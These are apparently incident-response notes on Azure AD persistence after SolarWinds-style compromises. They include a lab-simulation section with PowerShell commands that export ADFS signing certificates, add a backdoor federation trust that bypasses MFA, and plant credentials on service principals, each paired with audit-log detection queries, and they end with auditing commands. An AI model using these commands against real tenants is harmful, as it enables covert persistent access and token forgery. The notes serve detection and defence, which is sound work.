# Azure AD Incident Response

Rough notes for understanding the modifications the actor made to Azure AD to facilitate long-term access. Two methods were observed: 
* Abusing federation trusts - adding new federation trusts, modifying existing federation trusts to add new token-signing certificates
* Abusing service principals - adding credentials to existing service principals, adding new service principals with credentials, adding permissions to service principals and applications to access Microsoft Graph API

The actor was also seen stealing ADFS token-signing certificates to forge SAML tokens and facilitate long-term access. 

Background reading on defending against the threat: 
* [Microsoft technical blog on SolarWinds attacks](https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/)
* [Microsoft blog on Azure Sentinel Post-Compromise Hunting](https://techcommunity.microsoft.com/t5/azure-sentinel/solarwinds-post-compromise-hunting-with-azure-sentinel/ba-p/1995095)
* [Microsoft advice for incident responders](https://www.microsoft.com/security/blog/2020/12/21/advice-for-incident-responders-on-recovery-from-systemic-identity-compromises/)
* [Microsoft blog on Identity IOCs](https://techcommunity.microsoft.com/t5/azure-active-directory-identity/understanding-quot-solorigate-quot-s-identity-iocs-for-identity/ba-p/2007610)

## Notes for simulating attacks in a lab

* Purchase a test domain name. 
* Use Let's Encrypt to issue a wildcard certificate for the domain name. 
* Configure an Azure AD tenant and configure the domain as a custom domain. 
* Deploy three Windows Servers in Azure, and one test workstation. 
* Setup one of the Windows Servers as a domain controller, use the same domain name as previously registered. 
* Domain join all the other systems (after configuring the DC as the DNS server for the VNet). 
* Use AD Connect to configure federation with Azure AD, including configuring the ADFS server and the WAP. 
* Configure 443 access to the WAP from the internet.
* Configure Sentinel, onboard the security logs from all systems and the Azure AD audit logs. 
* Configure the diagnostic settings for Azure AD to collect all logs data types. 
* Enable audit logging in the Security & Compliance Center. 
* Create and configure a test application in Azure AD, configure Mail.Read permissions. Use the web application quick-start to log-in test users to the app and require them to consent access to their data. 

### Export ADFS certificate

PS> Export-AADIntADFSSigningCertificate -filename ADFSSigningCertificate.pfx  

Export the ADFS configuration for more information: 

PS> $ADFS = Get-WmiObject -Namespace root/ADFS -Class SecurityTokenService  
PS> $conn = $ADFS.ConfigurationDatabaseConnectionString  
PS> $SQLclient = new-object System.Data.SqlClient.SqlConnection -ArgumentList $conn  
PS> $SQLclient.Open()  
PS> $SQLcmd = $SQLclient.CreateCommand()  
PS> $SQLcmd.CommandText = "SELECT ServiceSettingsData from IdentityServerPolicy.ServiceSettings"  
PS> $SQLreader = $SQLcmd.ExecuteReader()  
PS> $SQLreader.Read() | Out-Null  
PS> $settings=$SQLreader.GetTextReader(0).ReadToEnd()  
PS> $SQLreader.Dispose()  
PS> \[xml\]$xml=$settings  

You can also use ADFSDump https://github.com/fireeye/ADFSDump

### Adding a malicious federation trust

PS> Get-AADIntAccessTokenForAADGraph -savetocache                                                                       
PS> ConvertTo-AADIntBackdoor -domain maliciousdomain.com     
PS> get-msoluser | select UserPrincipalName, ImmutableId  
PS> Open-AADIntOffice365Portal -ImmutableID $id -UseBuiltInCertificate -ByPassMFA $true -Issuer ISSUER  

Creates the Azure AD audit log:
AuditLogs | where OperationName =~ "Set domain authentication"

Updaing a token-signing certificate on an existing trust creates the event:
AuditLogs | where OperationName =~ "Set federation settings on domain" 

### Adding credentials to a service principle 

#### Certificate 

PS> $cert = New-SelfSignedCertificate -dnsname some.domain.com -CertStoreLocation cert:\LocalMachine\My -Provider “Microsoft Enhanced RSA and AES Cryptographic Provider”  
PS> $keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())   
PS> $sp = get-azureadserviceprincipal -searchstring SEARCHSTRING  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  
PS> Connect-AzureAD  -Tenant TENANTID -ApplicationID APPID -CertificateThumbprint CERTTHUMBPRINT  

Creates the Azure AD audit log:
AuditLogs | where OperationName =~ "Add service principal credentials"

#### Password

PS> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "01-01-2030 12:00:00" -StartDate "04-04-2020 12:00:00"  -Value PASSWORD  

Creates the log:
AuditLogs | where OperationName =~ "Add service principal credentials"

#### Create a new service principle 

PS> Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null}  
PS> $sp = New-AzADServicePrincipal -DisplayName 'MicrosoftSyncShare'  
PS> New-AzureADServicePrincipalKeyCredential -objectid $sp.ObjectId -EndDate "01-01-2022 12:00:00" -StartDate "01-03-2021 14:12:00" -CustomKeyIdentifier "Test" -Type AsymmetricX509Cert -Usage Verify -Value $keyValue  

## Auditing for backdoors 

PS> Install-module azureadpreview
PS> Connect-AzureAD  

PS> Install-module ExchangeOnlineManagement
PS> Connect-ExchangeOnline

PS> Install-module MSOnline
PS> Connect-MsolService  

PS> Invoke-WebRequest 'https://github.com/cisagov/Sparrow/raw/develop/Sparrow.ps1' -OutFile 'Sparrow.ps1' -UseBasicParsing  
PS> .\Sparrow.ps1

PS> Invoke-WebRequest 'https://github.com/CrowdStrike/CRT/blob/main/Get-CRTReport.ps1' -OutFile 'Get-CRTReport.ps1' -UseBasicParsing  
PS> .\Get-CRTReport.ps1

### Commands to manually audit federation trusts

**Azure AD**

PS> Get-MsolDomain | Format-List 
PS> Get-AzureADDomain | Format-List (newer version of the command above)
PS> Get-MsolFederationProperty -DomainName ******* | Format-List

**Exchange Online** 

PS> Get-FederationTrust | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo  | Format-List
PS> Get-FederatedOrganizationIdentifier -IncludeExtendedDomainInfo | select-object -expandproperty Domains  

### Commands to manually service principals with credentials

PS> Get-AzureADServicePrincipal  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$_.KeyCredentials -ne $null} | Select *  
PS> Get-AzureADServicePrincipal -all $true | Where-Object{$_.PasswordCredentials -ne $null} | Select *   

### Commands to manually look for service principals with risky permissions 

App permissions reference https://docs.microsoft.com/en-us/graph/permissions-reference   

List of risky app permissions https://github.com/mepples21/azureadconfigassessment  

Creat a test app https://docs.microsoft.com/en-gb/azure/active-directory/develop/quickstart-v2-javascript   

Microsoft blog references Mail.Read and Mail.ReadWrite

### Sentinel connectors

AzureActiveDirectory  
SecurityEvents  
Office365  
Microsoft 365 Defender  

### Other useful commands

PS> Get-AADIntLoginInformation -Domain domain.com  
PS> Get-AzureADTenantDetail | Select *  

## Further references

https://www.crowdstrike.com/blog/crowdstrike-launches-free-tool-to-identify-and-help-mitigate-risks-in-azure-active-directory/  

App vs Service principal - https://docs.microsoft.com/en-us/azure/active-directory/develop/app-objects-and-service-principals

https://twitter.com/SwiftOnSecurity/status/1217942428243632128?s=20  

https://www.youtube.com/watch?v=fpUZJxFK72k  

https://dirkjanm.io/talks/  

https://www.youtube.com/watch?v=SG2ibjuzRJM  

https://www.youtube.com/watch?v=JEIR5oGCwdg  

https://www.youtube.com/watch?v=LufXEPTlPak  

https://vimeo.com/214855977  

https://www.blackhillsinfosec.com/red-teaming-microsoft-part-1-active-directory-leaks-via-azure/  

https://www.fireeye.com/blog/threat-research/2020/09/detecting-microsoft-365-azure-active-directory-backdoors.html

https://www.youtube.com/watch?v=tJkjOnxcw6w


